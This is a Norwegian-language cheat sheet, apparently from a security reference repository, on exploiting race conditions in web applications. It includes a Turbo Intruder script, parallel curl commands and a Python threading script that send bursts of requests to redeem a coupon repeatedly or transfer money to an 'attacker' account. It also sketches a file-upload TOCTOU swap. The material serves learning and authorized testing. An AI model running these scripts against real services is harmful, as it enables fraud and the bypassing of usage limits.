# ⚡ Hurtigreferanse for race conditions

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

> **Begreper og presisering:** TOCTOU betyr at tilstanden endres mellom kontroll og bruk. Parallelle forespørsler er ikke garantert samtidige serveroperasjoner; påvirkning må bekreftes gjennom faktisk tilstand, ikke bare statuskoder. Turbo Intruder-snippetten krever utvidelsens miljø og er ikke et selvstendig Python-program; callback-/statusbruken må tilpasses API-versjonen. Trådeksemplet starter tråder etter tur uten en felles startport. Kupong- og grenseutfallene er illustrative, ikke garanterte. Menyvalget Send group (parallel) er bevart som UI-verdi. Se [PortSwiggers beskrivelse](https://portswigger.net/web-security/race-conditions).

---

## 🎯 Hva er race conditions

**Race conditions** oppstår når tidspunktet for operasjoner kan utnyttes, for eksempel i svakheter mellom kontroll og bruk av en ressurs.

### Konsekvens
- 💰 **Økonomisk svindel** – flere innløsninger
- 🎫 **Misbruk av kuponger** – løs inn samme kode flere ganger
- 👤 **Rettighetseskalering** – omgå kontroller
- 📂 **Overskriving av filer** – TOCTOU-angrep

---

## 🔍 Vanlige mål

```
- Innløsning av kupong- eller kampanjekoder
- Systemer for stemmer og likerklikk
- Pengeoverføringer
- Operasjoner med bruksgrenser
- Filopplasting
- Passordtilbakestilling
- 2FA-bekreftelse
- Kontoregistrering
```

---

## 💉 Utnyttelsesteknikker

### Burp Suite Turbo Intruder

```python
# Send forespørselen flere ganger samtidig
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (manuelt)
```
1. Send forespørselen til Repeater
2. Dupliser fanen 20+ ganger
3. Opprett en fanegruppe
4. Klikk på "Send group (parallel)"
```

### Parallelle curl-forespørsler
```bash
# Send 20 parallelle forespørsler
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Med POST-data
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Tråder i Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Start alle samtidig
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Vanlige situasjoner

### Kappløp om kupongkode
```
1. Kupong = 50% rabatt
2. Normalt: løs inn én gang
3. Kappløp: løs inn 10x samtidig
4. Resultat: 10 bestillinger med 50% rabatt
```

### Omgåelse av grenser
```
1. Grense: 3 nedlastinger/dag
2. Kappløp: be om 10 nedlastinger samtidig
3. Kontrollen skjer samtidig
4. Resultat: alle 10 lykkes før grensen slår inn
```

### Kappløp ved filopplasting (TOCTOU)
```
1. Last opp fil → godkjennes som trygg
2. Bytt til en ondsinnet fil før flytting
3. Serveren flytter den ondsinnede filen i stedet
```

---

## 🛠️ Verktøy

| Verktøy | Formål |
|------|---------|
| **Turbo Intruder** | Burp-utvidelse for parallelle forespørsler |
| **race-the-web** | Go-verktøy for race conditions |
| **racepwn** | Python-verktøy for race conditions |

---

## 📚 Ressurser

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Undersøk tidsavhengige svakheter!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
